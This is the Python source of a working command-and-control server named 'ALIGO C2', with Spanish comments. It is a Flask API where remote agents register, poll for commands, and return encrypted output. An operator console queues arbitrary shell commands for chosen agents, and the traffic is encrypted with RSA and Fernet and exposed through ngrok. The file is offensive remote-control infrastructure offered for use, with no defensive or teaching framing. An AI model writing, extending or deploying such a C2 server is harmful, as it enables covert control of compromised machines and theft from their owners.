"""
Servidor C2 - HTTPS Version con Cifrado Híbrido
Acepta conexiones de múltiples agentes vía HTTP/HTTPS, permite al operador
elegir un agente y mandarle comandos, recibe y muestra resultados.

Protocolo: HTTP con JSON (REST API) + RSA-2048 + Fernet encryption.
Compatible con ngrok: ngrok http 5000
"""

from flask import Flask, request, jsonify
import threading
import json
import uuid
import os
import sys
import time
from datetime import datetime

# Import crypto utilities
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from shared.crypto_utils import C2Crypto

HOST = "0.0.0.0"
PORT = int(os.getenv("PORT", 5000))  # Puerto configurable vía variable de entorno

app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False

# Cryptographic keys (RSA keypair for server)
server_private_key, server_public_key = C2Crypto.generate_rsa_keypair()
print(f"[*] Server RSA keypair generated (2048-bit)")

# Diccionario de agentes conectados: {agent_id: info}
agents = {}
agents_lock = threading.Lock()

# Session keys for each agent: {agent_id: fernet_key}
agent_session_keys = {}

# Cola de comandos pendientes por agente: {agent_id: [comandos...]}
pending_commands = {}

# Resultados recibidos (opcional, para debug)
results_history = []


# ============================================
# ENDPOINTS HTTP
# ============================================

@app.route('/public-key', methods=['GET'])
def public_key():
    """Return the server's RSA public key for agents to fetch."""
    pem_key = C2Crypto.serialize_public_key(server_public_key)
    return jsonify({"public_key": pem_key})


@app.route('/checkin', methods=['POST'])
def checkin():
    """Agente se registra inicialmente y envía su session key cifrada."""
    data = request.json
    agent_id = data.get('agent_id', str(uuid.uuid4())[:8])
    hostname = data.get('hostname', 'unknown')
    os_type = data.get('os', 'unknown')
    encrypted_session_key = data.get('encrypted_session_key')
    
    # Decrypt the agent's session key
    if encrypted_session_key:
        try:
            session_key = C2Crypto.rsa_decrypt(server_private_key, encrypted_session_key)
            with agents_lock:
                agent_session_keys[agent_id] = session_key
        except Exception as e:
            print(f"[!] Error decrypting session key from {agent_id}: {e}")
            return jsonify({"error": "Invalid session key"}), 400
    
    with agents_lock:
        agents[agent_id] = {
            "hostname": hostname,
            "os": os_type,
            "last_seen": datetime.now(),
            "ip": request.remote_addr
        }
        if agent_id not in pending_commands:
            pending_commands[agent_id] = []
    
    print(f"\n[+] Agente conectado: {agent_id} desde {request.remote_addr} ({hostname}) 🔒")
    print("> ", end="", flush=True)
    
    return jsonify({"status": "ok", "agent_id": agent_id})


@app.route('/poll', methods=['POST'])
def poll():
    """Agente pregunta si hay comandos pendientes (respuesta cifrada)."""
    data = request.json
    agent_id = data.get('agent_id')
    
    if not agent_id:
        return jsonify({"error": "agent_id requerido"}), 400
    
    # Actualizar last_seen
    with agents_lock:
        if agent_id in agents:
            agents[agent_id]['last_seen'] = datetime.now()
        
        # Verificar si hay comandos pendientes
        if agent_id in pending_commands and pending_commands[agent_id]:
            cmd = pending_commands[agent_id].pop(0)
            
            # Encrypt the command if agent has session key
            if agent_id in agent_session_keys:
                session_key = agent_session_keys[agent_id]
                cmd_json = json.dumps(cmd)
                encrypted_payload = C2Crypto.fernet_encrypt(session_key, cmd_json)
                return jsonify({"payload": encrypted_payload})
            else:
                # Fallback: send unencrypted (backwards compatibility)
                return jsonify(cmd)
    
    # No command available
    if agent_id in agent_session_keys:
        session_key = agent_session_keys[agent_id]
        no_cmd = {"command": None}
        encrypted_payload = C2Crypto.fernet_encrypt(session_key, json.dumps(no_cmd))
        return jsonify({"payload": encrypted_payload})
    
    return jsonify({"command": None})


@app.route('/result', methods=['POST'])
def result():
    """Agente envía el resultado de un comando ejecutado (cifrado)."""
    data = request.json
    agent_id = data.get('agent_id')
    encrypted_payload = data.get('payload')
    
    # Decrypt if agent has session key
    if agent_id in agent_session_keys and encrypted_payload:
        try:
            session_key = agent_session_keys[agent_id]
            decrypted_json = C2Crypto.fernet_decrypt(session_key, encrypted_payload)
            result_data = json.loads(decrypted_json)
            
            msg_id = result_data.get('id')
            output = result_data.get('output', '')
            status = result_data.get('status', 'ok')
            
            # Guardar en historial (opcional)
            results_history.append({
                "agent_id": agent_id,
                "id": msg_id,
                "output": output,
                "status": status,
                "timestamp": datetime.now()
            })
            
            # Mostrar resultado en consola
            print(f"\n[resultado de {agent_id}] (id={msg_id}):")
            print(output)
            print("> ", end="", flush=True)
            
            return jsonify({"status": "ok"})
        except Exception as e:
            print(f"\n[!] Error decrypting result from {agent_id}: {e}")
            print("> ", end="", flush=True)
            return jsonify({"error": "Decryption failed"}), 400
    
    # Fallback: unencrypted result (backwards compatibility)
    msg_id = data.get('id')
    output = data.get('output', '')
    status = data.get('status', 'ok')
    
    results_history.append({
        "agent_id": agent_id,
        "id": msg_id,
        "output": output,
        "status": status,
        "timestamp": datetime.now()
    })
    
    print(f"\n[resultado de {agent_id}] (id={msg_id}):")
    print(output)
    print("> ", end="", flush=True)
    
    return jsonify({"status": "ok"})


@app.route('/health', methods=['GET'])
def health():
    """Endpoint de salud para verificar que el servidor está vivo."""
    return jsonify({
        "status": "ok",
        "agents_connected": len(agents),
        "timestamp": datetime.now().isoformat()
    })


# ============================================
# CONSOLA DEL OPERADOR
# ============================================

def operator_console():
    """Consola interactiva para que el operador mande comandos."""
    print("Consola de operador. Comandos:")
    print("  list                  -> lista agentes conectados")
    print("  use <agent_id> <cmd>  -> manda un comando a un agente")
    print("  use @agent <cmd>      -> usa el único agente (si solo hay uno)")
    print("  exit                  -> salir\n")

    while True:
        try:
            line = input("> ").strip()
        except EOFError:
            break
        except KeyboardInterrupt:
            print("\n[*] Usa 'exit' para salir")
            continue

        if not line:
            continue

        if line == "list":
            from datetime import timedelta
            with agents_lock:
                # Filtrar solo agentes activos (última actividad < 30 segundos)
                now = datetime.now()
                active_threshold = timedelta(seconds=30)
                active_agents = {
                    aid: info for aid, info in agents.items()
                    if (now - info['last_seen']) < active_threshold
                }
                
                if not active_agents:
                    print("(sin agentes conectados)")
                else:
                    for aid, info in active_agents.items():
                        last_seen = info['last_seen'].strftime("%H:%M:%S")
                        print(f" - {aid} | {info['hostname']} | {info['os']} | last_seen: {last_seen}")

        elif line.startswith("use "):
            parts = line.split(" ", 2)
            if len(parts) < 3:
                print("Uso: use <agent_id> <comando>")
                print("     use @agent <comando>  (usa el único agente si solo hay uno)")
                continue
            _, agent_id, command = parts
            
            # Si usa @agent, auto-selecciona el único agente conectado
            if agent_id == "@agent":
                with agents_lock:
                    if len(agents) == 0:
                        print("Error: No hay agentes conectados")
                        continue
                    elif len(agents) == 1:
                        agent_id = list(agents.keys())[0]
                        print(f"[auto-seleccionado] {agent_id}")
                    else:
                        print(f"Error: Hay {len(agents)} agentes conectados. Especifica uno:")
                        for aid in agents:
                            print(f" - {aid}")
                        continue
            
            with agents_lock:
                if agent_id not in agents:
                    print(f"Agente '{agent_id}' no encontrado")
                    continue
            
            # Crear comando y agregarlo a la cola
            msg_id = str(uuid.uuid4())[:8]
            cmd_obj = {
                "type": "cmd",
                "id": msg_id,
                "command": command
            }
            
            with agents_lock:
                if agent_id not in pending_commands:
                    pending_commands[agent_id] = []
                pending_commands[agent_id].append(cmd_obj)
            
            print(f"[enviado] id={msg_id} -> {agent_id}: {command}")

        elif line == "exit":
            print("[*] Cerrando servidor...")
            os._exit(0)

        else:
            print(f"Comando no reconocido: {line}")


# ============================================
# MAIN
# ============================================

def main():
    print("=" * 60)
    print("  ALIGO C2 - Servidor HTTPS con Cifrado Híbrido")
    print("=" * 60)
    print(f"[*] Servidor HTTP escuchando en {HOST}:{PORT}")
    print(f"[*] Cifrado: RSA-2048 + Fernet (AES-128-CBC)")
    print(f"[*] Usa ngrok con: ngrok http {PORT}")
    print(f"[*] Los logs de Flask se muestran mezclados con la consola")
    print(f"[*] Esto es normal - los comandos funcionan correctamente")
    print()
    
    # Thread de limpieza automática de agentes inactivos
    def cleanup_inactive_agents():
        from datetime import timedelta
        while True:
            time.sleep(60)  # Cada 60 segundos
            with agents_lock:
                now = datetime.now()
                inactive_threshold = timedelta(minutes=2)  # 2 minutos sin actividad
                inactive_agents = [
                    aid for aid, info in agents.items()
                    if (now - info['last_seen']) > inactive_threshold
                ]
                for aid in inactive_agents:
                    agents.pop(aid, None)
                    pending_commands.pop(aid, None)
                    agent_session_keys.pop(aid, None)  # Limpiar session keys también
                    # No imprimir nada para no interrumpir la consola
    
    cleanup_thread = threading.Thread(target=cleanup_inactive_agents, daemon=True)
    cleanup_thread.start()
    
    # Iniciar Flask en un thread separado
    def run_flask():
        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)  # Solo errores, no logs de cada request
        app.run(host=HOST, port=PORT, debug=False, use_reloader=False)
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Dar tiempo a Flask para iniciar
    time.sleep(1)
    
    # Iniciar consola del operador en el thread principal
    try:
        operator_console()
    except KeyboardInterrupt:
        print("\n[*] Servidor detenido")
        sys.exit(0)


if __name__ == "__main__":
    main()
